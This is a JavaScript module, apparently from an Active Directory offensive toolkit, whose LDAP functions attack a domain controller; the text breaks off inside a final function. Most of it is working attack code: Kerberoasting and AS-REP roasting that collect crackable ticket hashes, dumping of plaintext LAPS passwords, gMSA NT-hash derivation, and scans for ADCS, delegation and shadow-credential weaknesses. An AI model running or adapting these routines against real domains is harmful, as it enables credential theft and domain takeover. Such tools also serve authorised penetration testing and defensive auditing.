import { LdapClient, SCOPE } from '../ldap/client.js';
import { loadTls } from '../tls/index.js';
import { ntlmSpnegoProducer, parseIdentity } from '../ntlm/sasl.js';
import { kerberosSpnegoBind } from '../kerberos/ldap-bind.js';
import { KerberosClient, KdcSocketTransport } from '../kerberos/client.js';
import { ETYPE, MSG_TYPE, NAME_TYPE, KDC_OPTIONS } from '../kerberos/constants.js';
import { parseTicket, parseKdcRep, kdcReq, kdcReqBody } from '../kerberos/asn1.js';
import { md4 } from '../crypto/md4.js';

function ldapPort(tls) { return tls ? 636 : 389; }

async function connect(host, creds, opts) {
  const port = ldapPort(opts.tls);
  const client = new LdapClient();
  const connectOpts = {};
  if (opts.tls) {
    connectOpts.tls = { TlsSession: loadTls(), sni: host };
  }
  await client.connect(host, port, connectOpts);
  const { user, domain } = parseIdentity(creds.user, creds.domain);
  if (opts.auth === 'kerberos') {
    await kerberosSpnegoBind(client, {
      user, domain, password: creds.password, hash: creds.hash,
      kdcHost: opts.kdc || host, spn: `ldap/${host}`,
    });
  } else if (opts.auth === 'simple') {
    await client.bind(`${user}@${domain}`, creds.password);
  } else {
    await client.saslBind('GSS-SPNEGO', ntlmSpnegoProducer({
      user, domain, password: creds.password, ntHash: creds.hash,
    }));
  }
  return { client, domain };
}

function baseDN(domain) {
  return domain.split('.').map(d => `DC=${d}`).join(',');
}

async function searchAll(client, base, filter, attrs, sdFlags = false) {
  const entries = [];
  for await (const e of client.search({ baseDN: base, scope: SCOPE.SUBTREE, filter, attributes: attrs, sdFlags })) {
    entries.push(e);
  }
  return entries;
}

// LDAP attribute values come off the wire as Uint8Array (or arrays thereof
// for multi-valued attributes). Almost every LDAP module in this file wants
// the value as a JS string. `decodeAttr` always returns a single string —
// takes the first element if the value is an array. Use `decodeAttrList`
// when the attribute is genuinely multi-valued (memberOf, servicePrincipalName).
const attrTextDecoder = new TextDecoder('utf-8');
function decodeAttr(v) {
  if (v == null) return '';
  if (Array.isArray(v)) return v.length ? decodeAttr(v[0]) : '';
  if (typeof v === 'string') return v;
  if (v instanceof Uint8Array) return attrTextDecoder.decode(v);
  return String(v);
}
function decodeAttrList(v) {
  if (v == null) return [];
  if (Array.isArray(v)) return v.map(decodeAttr);
  return [decodeAttr(v)];
}

export async function ldapSigning(host, creds, opts, log) {
  const results = {};
  try {
    const port = ldapPort(false);
    const client = new LdapClient();
    await client.connect(host, port);
    const { user, domain } = parseIdentity(creds.user, creds.domain);
    try {
      await client.saslBind('GSS-SPNEGO', ntlmSpnegoProducer({
        user, domain, password: creds.password, ntHash: creds.hash,
      }));
      results.ldapSigning = false;
      log('warn', 'ldap', host, 'signing', 'LDAP signing NOT required (plaintext NTLM bind succeeded)');
      await client.unbind();
    } catch (e) {
      if (e.message && e.message.includes('strongerAuthRequired')) {
        results.ldapSigning = true;
        log('ok', 'ldap', host, 'signing', 'LDAP signing required');
      } else {
        results.ldapSigning = 'unknown';
        log('info', 'ldap', host, 'signing', `bind failed: ${e.message}`);
      }
    }
  } catch (e) {
    log('err', 'ldap', host, 'signing', e.message);
  }
  try {
    const port636 = ldapPort(true);
    const client2 = new LdapClient();
    const raw = new TCPSocket(host, port636);
    const { readable, writable } = await raw.opened;
    const tls = new TlsSocket(readable, writable, host);
    await tls.handshake();
    client2.attachTls(tls);
    const { user, domain } = parseIdentity(creds.user, creds.domain);
    try {
      await client2.saslBind('GSS-SPNEGO', ntlmSpnegoProducer({
        user, domain, password: creds.password, ntHash: creds.hash,
      }));
      results.channelBinding = false;
      log('warn', 'ldap', host, 'channel-binding', 'LDAPS channel binding NOT enforced');
      await client2.unbind();
    } catch (e) {
      if (e.message && (e.message.includes('channelBinding') || e.message.includes('strongerAuthRequired'))) {
        results.channelBinding = true;
        log('ok', 'ldap', host, 'channel-binding', 'LDAPS channel binding enforced');
      } else {
        results.channelBinding = 'unknown';
        log('info', 'ldap', host, 'channel-binding', `LDAPS bind failed: ${e.message}`);
      }
    }
  } catch (e) {
    log('info', 'ldap', host, 'channel-binding', `LDAPS not reachable: ${e.message}`);
  }
  return results;
}

export async function ldapAuth(host, creds, opts, log) {
  try {
    const { client } = await connect(host, creds, opts);
    log('ok', 'ldap', host, `${creds.domain}\\${creds.user}`, 'bind OK');
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, `${creds.domain}\\${creds.user}`, e.message);
    return false;
  }
}

export async function ldapUsers(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(&(objectCategory=person)(objectClass=user))',
      ['sAMAccountName', 'description', 'memberOf', 'userAccountControl', 'badPwdCount', 'lastLogon', 'sIDHistory']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName;
      const sidHist = e.attributes?.sIDHistory;
      const sidHistList = Array.isArray(sidHist) ? sidHist : sidHist ? [sidHist] : [];
      const extra = sidHistList.length ? ` [SIDHistory: ${sidHistList.length}]` : '';
      if (sam) log('ok', 'ldap', host, sam, (e.attributes?.description || '') + extra);
    }
    await client.unbind();
    return entries.map(e => e.attributes?.sAMAccountName).filter(Boolean);
  } catch (e) {
    log('err', 'ldap', host, 'users', e.message);
    return null;
  }
}

export async function ldapGroups(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(objectClass=group)',
      ['sAMAccountName', 'description', 'member']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName;
      const count = Array.isArray(e.attributes?.member) ? e.attributes.member.length : 0;
      if (sam) log('ok', 'ldap', host, sam, `${count} member(s)`);
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'groups', e.message);
    return null;
  }
}

export async function ldapComputers(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(objectClass=computer)',
      ['sAMAccountName', 'operatingSystem', 'dNSHostName', 'operatingSystemVersion']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName;
      if (sam) log('ok', 'ldap', host, sam, `${e.attributes?.operatingSystem || ''} ${e.attributes?.operatingSystemVersion || ''}`);
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'computers', e.message);
    return null;
  }
}

export async function ldapDCs(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
      ['sAMAccountName', 'dNSHostName', 'operatingSystem']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName;
      if (sam) log('ok', 'ldap', host, sam, e.attributes?.dNSHostName || '');
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'dcs', e.message);
    return null;
  }
}

export async function ldapSpns(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
      ['sAMAccountName', 'servicePrincipalName']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName;
      const spns = e.attributes?.servicePrincipalName;
      const spnList = Array.isArray(spns) ? spns : spns ? [spns] : [];
      if (sam) log('ok', 'ldap', host, sam, spnList[0] || '');
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'spns', e.message);
    return null;
  }
}

function hexToBytes(h) {
  const clean = h.replace(/[^0-9a-fA-F]/g, '');
  const out = new Uint8Array(clean.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(clean.substr(i * 2, 2), 16);
  return out;
}

function toHex(bytes) {
  return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
}

function formatKerberoastHash(user, realm, spn, encPart) {
  const { etype, cipher } = encPart;
  if (etype === 23) {
    return `$krb5tgs$23$*${user}$${realm}$${spn}*$${toHex(cipher.slice(0, 16))}$${toHex(cipher.slice(16))}`;
  }
  return `$krb5tgs$${etype}$${user}$${realm}$*${spn}*$${toHex(cipher.slice(-12))}$${toHex(cipher.slice(0, -12))}`;
}

export async function ldapKerberoast(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
      ['sAMAccountName', 'servicePrincipalName', 'memberOf']);

    if (!entries.length) {
      log('ok', 'ldap', host, 'kerberoast', 'no kerberoastable users found');
      await client.unbind();
      return [];
    }

    log('ok', 'ldap', host, 'kerberoast', `${entries.length} kerberoastable user(s) found, requesting TGS tickets...`);

    const realm = domain.toUpperCase();
    const kdcHost = opts.kdc || host;
    const transport = new KdcSocketTransport(kdcHost, 88);
    await transport.connect();
    const hashes = [];

    try {
      const krb = new KerberosClient(transport);
      const { user: authUser } = parseIdentity(creds.user, creds.domain);
      const id = { username: authUser, realm };
      if (creds.hash) {
        const hashHex = creds.hash.includes(':') ? creds.hash.split(':')[1] : creds.hash;
        id.key = hexToBytes(hashHex);
        id.etype = ETYPE.RC4_HMAC;
      } else {
        id.password = creds.password;
      }

      const tgt = await krb.getTGT(id);

      for (const e of entries) {
        const sam = decodeAttr(e.attributes?.sAMAccountName);
        const spnList = decodeAttrList(e.attributes?.servicePrincipalName);
        if (!sam || !spnList.length) continue;
        const spn = spnList[0];
        try {
          const tgs = await krb.getTGS(tgt, {
            spn,
            etypes: [ETYPE.RC4_HMAC, ETYPE.AES256_CTS_HMAC_SHA1_96, ETYPE.AES128_CTS_HMAC_SHA1_96],
          });
          const ticketInfo = parseTicket(tgs.ticket);
          const hashStr = formatKerberoastHash(sam, ticketInfo.realm, spn, ticketInfo.encPart);
          hashes.push(hashStr);
          log('ok', 'ldap', host, sam, hashStr);
        } catch (kerr) {
          log('err', 'ldap', host, sam, `TGS-REQ failed: ${kerr.message}`);
        }
      }
    } finally {
      await transport.close();
    }

    await client.unbind();
    return hashes;
  } catch (e) {
    log('err', 'ldap', host, 'kerberoast', e.message);
    return null;
  }
}

function formatAsrepHash(user, realm, encPart) {
  const { etype, cipher } = encPart;
  if (etype === 23) {
    return `$krb5asrep$23$${user}@${realm}:${toHex(cipher.slice(0, 16))}$${toHex(cipher.slice(16))}`;
  }
  return `$krb5asrep$${etype}$${user}@${realm}:${toHex(cipher.slice(-12))}$${toHex(cipher.slice(0, -12))}`;
}

export async function ldapAsrep(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
      ['sAMAccountName']);

    if (!entries.length) {
      log('ok', 'ldap', host, 'asrep', 'no AS-REP roastable users found');
      await client.unbind();
      return [];
    }

    log('ok', 'ldap', host, 'asrep', `${entries.length} AS-REP roastable user(s), requesting AS-REP hashes...`);
    const realm = domain.toUpperCase();
    const kdcHost = opts.kdc || host;
    const transport = new KdcSocketTransport(kdcHost, 88);
    await transport.connect();
    const hashes = [];

    try {
      for (const e of entries) {
        const sam = decodeAttr(e.attributes?.sAMAccountName);
        if (!sam) continue;
        try {
          const body = kdcReqBody({
            kdcOptions: KDC_OPTIONS.FORWARDABLE | KDC_OPTIONS.PROXIABLE | KDC_OPTIONS.RENEWABLE,
            cname: [sam], cnameType: NAME_TYPE.PRINCIPAL, realm,
            sname: ['krbtgt', realm], snameType: NAME_TYPE.SRV_INST,
            till: new Date(Date.UTC(2037, 8, 13, 2, 48, 5)),
            nonce: (globalThis.crypto.getRandomValues(new Uint8Array(4))[0] << 24 | globalThis.crypto.getRandomValues(new Uint8Array(4))[1] << 16) >>> 0,
            etypes: [ETYPE.RC4_HMAC, ETYPE.AES256_CTS_HMAC_SHA1_96, ETYPE.AES128_CTS_HMAC_SHA1_96],
          });
          const req = kdcReq(MSG_TYPE.AS_REQ, body, []);
          const reply = await transport.request(req);

          if (reply[0] === 0x6b) {
            const rep = parseKdcRep(reply);
            const hashStr = formatAsrepHash(sam, realm, rep.encPart);
            hashes.push(hashStr);
            log('ok', 'ldap', host, sam, hashStr);
          } else if (reply[0] === 0x7e) {
            log('warn', 'ldap', host, sam, 'DONT_REQ_PREAUTH set but KDC rejected (preauth required?)');
          }
        } catch (kerr) {
          log('err', 'ldap', host, sam, `AS-REQ failed: ${kerr.message}`);
        }
      }
    } finally {
      await transport.close();
    }

    await client.unbind();
    return hashes;
  } catch (e) {
    log('err', 'ldap', host, 'asrep', e.message);
    return null;
  }
}

export async function ldapPassPol(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    for await (const e of client.search({ baseDN: base, scope: SCOPE.BASE, filter: '(objectClass=*)',
      attributes: ['minPwdLength', 'maxPwdAge', 'minPwdAge', 'pwdHistoryLength', 'lockoutThreshold', 'lockoutDuration', 'lockOutObservationWindow'] })) {
      const a = e.attributes || {};
      log('ok', 'ldap', host, 'minPwdLength', a.minPwdLength || '?');
      log('ok', 'ldap', host, 'lockoutThreshold', a.lockoutThreshold || '?');
      log('ok', 'ldap', host, 'pwdHistoryLength', a.pwdHistoryLength || '?');
      if (a.maxPwdAge) log('ok', 'ldap', host, 'maxPwdAge', a.maxPwdAge);
      if (a.lockoutDuration) log('ok', 'ldap', host, 'lockoutDuration', a.lockoutDuration);
    }
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'pass-pol', e.message);
    return null;
  }
}

export async function ldapLaps(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(&(objectClass=computer)(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)))',
      ['sAMAccountName', 'ms-Mcs-AdmPwd', 'msLAPS-Password', 'msLAPS-EncryptedPassword', 'ms-Mcs-AdmPwdExpirationTime']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName;
      const pwd = e.attributes?.['ms-Mcs-AdmPwd'] || e.attributes?.['msLAPS-Password'] || '';
      if (sam) log('ok', 'ldap', host, sam, pwd ? `LAPS: ${pwd}` : 'LAPS: encrypted');
    }
    if (!entries.length) log('info', 'ldap', host, 'laps', 'no LAPS passwords readable');
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'laps', e.message);
    return null;
  }
}

export async function ldapGmsa(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(objectClass=msDS-GroupManagedServiceAccount)',
      ['sAMAccountName', 'msDS-ManagedPasswordId', 'msDS-GroupMSAMembership', 'msDS-ManagedPasswordInterval', 'msDS-ManagedPassword']);
    if (!entries.length) {
      log('info', 'ldap', host, 'gmsa', 'no gMSA accounts found');
      await client.unbind();
      return [];
    }
    const results = [];
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName;
      if (!sam) continue;
      const pwdBlob = e.attributes?.['msDS-ManagedPassword'];
      const rawBlob = Array.isArray(pwdBlob) ? pwdBlob[0] : pwdBlob;
      if (rawBlob && rawBlob.length >= 16) {
        const blob = rawBlob instanceof Uint8Array ? rawBlob : new Uint8Array(rawBlob);
        const dv = new DataView(blob.buffer, blob.byteOffset, blob.byteLength);
        const currentPwdOff = dv.getUint16(8, true);
        if (currentPwdOff && currentPwdOff + 2 <= blob.length) {
          let pwdEnd = blob.length;
          const oldPwdOff = dv.getUint16(12, true);
          if (oldPwdOff && oldPwdOff > currentPwdOff) pwdEnd = oldPwdOff;
          const password = blob.slice(currentPwdOff, pwdEnd);
          const ntHash = md4(password);
          const hashHex = toHex(ntHash);
          log('ok', 'ldap', host, sam, `NT: ${hashHex}`);
          results.push({ sam, ntHash: hashHex });
        } else {
          log('warn', 'ldap', host, sam, 'gMSA blob unreadable (wrong offset)');
        }
      } else {
        log('warn', 'ldap', host, sam, 'gMSA account (no msDS-ManagedPassword readable — check ACL)');
      }
    }
    await client.unbind();
    return results;
  } catch (e) {
    log('err', 'ldap', host, 'gmsa', e.message);
    return null;
  }
}

export async function ldapDelegation(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const unconstrained = await searchAll(client, base,
      '(&(!(userAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))',
      ['sAMAccountName', 'userAccountControl']);
    for (const e of unconstrained) {
      log('warn', 'ldap', host, e.attributes?.sAMAccountName, 'UNCONSTRAINED delegation');
    }
    const constrained = await searchAll(client, base,
      '(&(!(userAccountControl:1.2.840.113556.1.4.803:=2))(msDS-AllowedToDelegateTo=*))',
      ['sAMAccountName', 'msDS-AllowedToDelegateTo']);
    for (const e of constrained) {
      const targets = e.attributes?.['msDS-AllowedToDelegateTo'];
      const targetList = Array.isArray(targets) ? targets : targets ? [targets] : [];
      log('warn', 'ldap', host, e.attributes?.sAMAccountName, `CONSTRAINED → ${targetList.join(', ')}`);
    }
    const rbcd = await searchAll(client, base,
      '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)',
      ['sAMAccountName', 'msDS-AllowedToActOnBehalfOfOtherIdentity']);
    for (const e of rbcd) {
      log('warn', 'ldap', host, e.attributes?.sAMAccountName, 'RBCD configured');
    }
    log('ok', 'ldap', host, 'delegation', `${unconstrained.length} unconstrained, ${constrained.length} constrained, ${rbcd.length} RBCD`);
    await client.unbind();
    return { unconstrained, constrained, rbcd };
  } catch (e) {
    log('err', 'ldap', host, 'delegation', e.message);
    return null;
  }
}

export async function ldapTrusts(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(objectClass=trustedDomain)',
      ['cn', 'trustDirection', 'trustType', 'trustAttributes', 'flatName']);
    const DIR = { 0: 'DISABLED', 1: 'INBOUND', 2: 'OUTBOUND', 3: 'BIDIRECTIONAL' };
    for (const e of entries) {
      const cn = e.attributes?.cn;
      const dir = DIR[e.attributes?.trustDirection] || e.attributes?.trustDirection;
      if (cn) log('ok', 'ldap', host, cn, `${dir} trust`);
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'trusts', e.message);
    return null;
  }
}

export async function ldapAdcs(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const configBase = `CN=Configuration,${baseDN(domain)}`;
    const cas = await searchAll(client, `CN=Enrollment Services,CN=Public Key Services,CN=Services,${configBase}`,
      '(objectClass=pKIEnrollmentService)',
      ['cn', 'dNSHostName', 'certificateTemplates']);
    for (const e of cas) {
      const cn = e.attributes?.cn;
      const templates = e.attributes?.certificateTemplates;
      const tmplList = Array.isArray(templates) ? templates : templates ? [templates] : [];
      if (cn) log('ok', 'ldap', host, `CA: ${cn}`, `${tmplList.length} template(s)`);
    }
    const templates = await searchAll(client,
      `CN=Certificate Templates,CN=Public Key Services,CN=Services,${configBase}`,
      '(objectClass=pKICertificateTemplate)',
      ['cn', 'msPKI-Certificate-Name-Flag', 'msPKI-Enrollment-Flag', 'pKIExtendedKeyUsage',
       'msPKI-RA-Signature', 'msPKI-Certificate-Application-Policy', 'msPKI-Private-Key-Flag',
       'pKIOverlapPeriod', 'nTSecurityDescriptor', 'objectGUID'], true);
    const ENROLLEE_SUPPLIES_SUBJECT = 0x00000001;
    const CT_FLAG_PEND_ALL_REQUESTS = 0x00000002;
    const ANY_PURPOSE = '2.5.29.37.0';
    const CLIENT_AUTH = '1.3.6.1.5.5.7.3.2';
    const SMART_CARD = '1.3.6.1.4.1.311.20.2.2';
    const CERT_REQ_AGENT = '1.3.6.1.4.1.311.20.2.1';
    const SUB_CA = ''; // empty EKU = SubCA
    const findings = [];

    for (const e of templates) {
      const cn = e.attributes?.cn;
      const nameFlag = parseInt(e.attributes?.['msPKI-Certificate-Name-Flag'] || '0');
      const enrollFlag = parseInt(e.attributes?.['msPKI-Enrollment-Flag'] || '0');
      const raSignatures = parseInt(e.attributes?.['msPKI-RA-Signature'] || '0');
      const eku = e.attributes?.pKIExtendedKeyUsage;
      const ekuList = Array.isArray(eku) ? eku : eku ? [eku] : [];
      const appPolicy = e.attributes?.['msPKI-Certificate-Application-Policy'];
      const appPolicyList = Array.isArray(appPolicy) ? appPolicy : appPolicy ? [appPolicy] : [];
      const hasClientAuth = ekuList.some(e => e === CLIENT_AUTH || e === SMART_CARD || e === ANY_PURPOSE);
      const hasAnyPurpose = ekuList.some(e => e === ANY_PURPOSE) || ekuList.length === 0;
      const hasCertReqAgent = ekuList.some(e => e === CERT_REQ_AGENT);
      const noManagerApproval = !(enrollFlag & CT_FLAG_PEND_ALL_REQUESTS);

      // ESC1: enrollee supplies subject + client auth + no manager approval + no RA signature
      if ((nameFlag & ENROLLEE_SUPPLIES_SUBJECT) && hasClientAuth && raSignatures === 0 && noManagerApproval) {
        log('warn', 'ldap', host, `ESC1: ${cn}`, 'ENROLLEE_SUPPLIES_SUBJECT + Client Auth');
        findings.push({ esc: 1, template: cn });
      }
      // ESC2: any purpose or no EKU (SubCA) + no manager approval + no RA signature
      if (hasAnyPurpose && raSignatures === 0 && noManagerApproval && ekuList.length > 0) {
        log('warn', 'ldap', host, `ESC2: ${cn}`, 'Any Purpose EKU — can be used for any auth');
        findings.push({ esc: 2, template: cn });
      }
      // ESC3: Certificate Request Agent EKU
      if (hasCertReqAgent && raSignatures === 0 && noManagerApproval) {
        log('warn', 'ldap', host, `ESC3: ${cn}`, 'Certificate Request Agent EKU');
        findings.push({ esc: 3, template: cn });
      }
      // ESC4 requires ACL analysis (not easily done via simple LDAP attrs, skip for now)
      // ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA — checked below
      // ESC8: HTTP enrollment endpoint — checked below
    }

    // ESC6: check CA flags for EDITF_ATTRIBUTESUBJECTALTNAME2
    for (const ca of cas) {
      const caFlags = parseInt(ca.attributes?.flags || '0');
      if (caFlags & 0x00040000) {
        const caName = ca.attributes?.cn;
        log('warn', 'ldap', host, `ESC6: ${caName}`, 'EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA');
        findings.push({ esc: 6, ca: caName });
      }
    }

    // ESC8: check for HTTP enrollment endpoints
    for (const ca of cas) {
      const caName = ca.attributes?.cn;
      const dnsName = ca.attributes?.dNSHostName || '';
      if (dnsName) {
        log('info', 'ldap', host, `ESC8: ${caName}`, `check http://${dnsName}/certsrv/ for HTTP enrollment`);
        findings.push({ esc: 8, ca: caName, host: dnsName });
      }
    }

    await client.unbind();
    return { cas, templates, findings };
  } catch (e) {
    log('err', 'ldap', host, 'adcs', e.message);
    return null;
  }
}

export async function ldapMaq(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    for await (const e of client.search({ baseDN: base, scope: SCOPE.BASE, filter: '(objectClass=*)', attributes: ['ms-DS-MachineAccountQuota'] })) {
      const maq = e.attributes?.['ms-DS-MachineAccountQuota'] || '0';
      log('ok', 'ldap', host, 'MachineAccountQuota', maq);
    }
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'maq', e.message);
    return null;
  }
}

export async function ldapDesc(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(&(objectClass=user)(description=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
      ['sAMAccountName', 'description']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName;
      if (sam) log('ok', 'ldap', host, sam, e.attributes?.description);
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'desc', e.message);
    return null;
  }
}

export async function ldapAdmins(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const privilegedGroups = [
      { rid: 512, name: 'Domain Admins' },
      { rid: 519, name: 'Enterprise Admins' },
      { rid: 518, name: 'Schema Admins' },
      { rid: 544, name: 'Administrators' },
    ];
    for (const g of privilegedGroups) {
      const entries = await searchAll(client, base,
        `(memberOf=CN=${g.name},CN=Users,${base})`,
        ['sAMAccountName']);
      for (const e of entries) {
        const sam = e.attributes?.sAMAccountName;
        if (sam) log('ok', 'ldap', host, sam, g.name);
      }
    }
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'admins', e.message);
    return null;
  }
}

export async function ldapFgpp(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client,
      `CN=Password Settings Container,CN=System,${base}`,
      '(objectClass=msDS-PasswordSettings)',
      ['cn', 'msDS-MinimumPasswordLength', 'msDS-LockoutThreshold',
       'msDS-PasswordHistoryLength', 'msDS-MaximumPasswordAge',
       'msDS-PasswordSettingsPrecedence', 'msDS-PSOAppliesTo']);
    for (const e of entries) {
      const cn = e.attributes?.cn;
      if (cn) log('ok', 'ldap', host, `FGPP: ${cn}`,
        `minLen=${e.attributes?.['msDS-MinimumPasswordLength'] || '?'} lockout=${e.attributes?.['msDS-LockoutThreshold'] || '?'}`);
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'fgpp', e.message);
    return null;
  }
}

export async function ldapSubnets(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const configBase = `CN=Configuration,${baseDN(domain)}`;
    const entries = await searchAll(client,
      `CN=Subnets,CN=Sites,${configBase}`,
      '(objectClass=subnet)',
      ['cn', 'siteObject', 'description']);
    for (const e of entries) {
      const cn = e.attributes?.cn;
      if (cn) log('ok', 'ldap', host, cn, e.attributes?.description || '');
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'subnets', e.message);
    return null;
  }
}

export async function ldapOUs(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(objectClass=organizationalUnit)',
      ['ou', 'distinguishedName', 'description']);
    for (const e of entries) {
      const ou = e.attributes?.ou || '';
      const desc = e.attributes?.description || '';
      log('ok', 'ldap', host, ou, desc || e.attributes?.distinguishedName || '');
    }
    if (!entries.length) log('info', 'ldap', host, 'ous', 'no OUs found');
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'ous', e.message);
    return null;
  }
}

export async function ldapGPOs(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(objectClass=groupPolicyContainer)',
      ['displayName', 'cn', 'gPCFileSysPath', 'flags', 'distinguishedName']);
    for (const e of entries) {
      const name = e.attributes?.displayName || e.attributes?.cn || '';
      const path = e.attributes?.gPCFileSysPath || '';
      const flags = parseInt(e.attributes?.flags || '0');
      const status = flags === 0 ? 'enabled' : flags === 1 ? 'user-disabled' : flags === 2 ? 'computer-disabled' : flags === 3 ? 'all-disabled' : `flags=${flags}`;
      log('ok', 'ldap', host, name, `${status} ${path}`);
    }
    if (!entries.length) log('info', 'ldap', host, 'gpos', 'no GPOs found');
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'gpos', e.message);
    return null;
  }
}

export async function ldapDNS(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const domainDN = baseDN(domain);
    const dnsBase = `DC=DomainDnsZones,${domainDN}`;
    let entries;
    try {
      entries = await searchAll(client, `CN=MicrosoftDNS,${dnsBase}`,
        '(objectClass=dnsZone)', ['dc', 'name', 'distinguishedName']);
    } catch {
      entries = await searchAll(client, `CN=MicrosoftDNS,CN=System,${domainDN}`,
        '(objectClass=dnsZone)', ['dc', 'name', 'distinguishedName']);
    }
    for (const e of entries) {
      const name = e.attributes?.dc || e.attributes?.name || '';
      log('ok', 'ldap', host, `zone: ${name}`, e.attributes?.distinguishedName || '');
    }
    if (!entries.length) log('info', 'ldap', host, 'dns', 'no DNS zones found');
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'dns', e.message);
    return null;
  }
}

export async function ldapShadowCreds(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      '(msDS-KeyCredentialLink=*)',
      ['sAMAccountName', 'msDS-KeyCredentialLink', 'distinguishedName']);
    if (!entries.length) {
      log('ok', 'ldap', host, 'shadow-creds', 'no objects with msDS-KeyCredentialLink found');
    } else {
      for (const e of entries) {
        const sam = e.attributes?.sAMAccountName || '';
        const kcl = e.attributes?.['msDS-KeyCredentialLink'];
        const count = Array.isArray(kcl) ? kcl.length : kcl ? 1 : 0;
        log('warn', 'ldap', host, sam, `msDS-KeyCredentialLink set (${count} credential(s))`);
      }
    }
    const computers = await searchAll(client, base,
      '(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
      ['sAMAccountName', 'msDS-KeyCredentialLink']);
    let writable = 0;
    for (const e of computers) {
      const kcl = e.attributes?.['msDS-KeyCredentialLink'];
      if (!kcl) writable++;
    }
    log('ok', 'ldap', host, 'shadow-creds', `${entries.length} with KCL set, ${writable}/${computers.length} computers without KCL (potential targets)`);
    await client.unbind();
    return { withKCL: entries.length, potentialTargets: writable };
  } catch (e) {
    log('err', 'ldap', host, 'shadow-creds', e.message);
    return null;
  }
}

export async function ldapNoPac(host, creds, opts, log) {
  try {
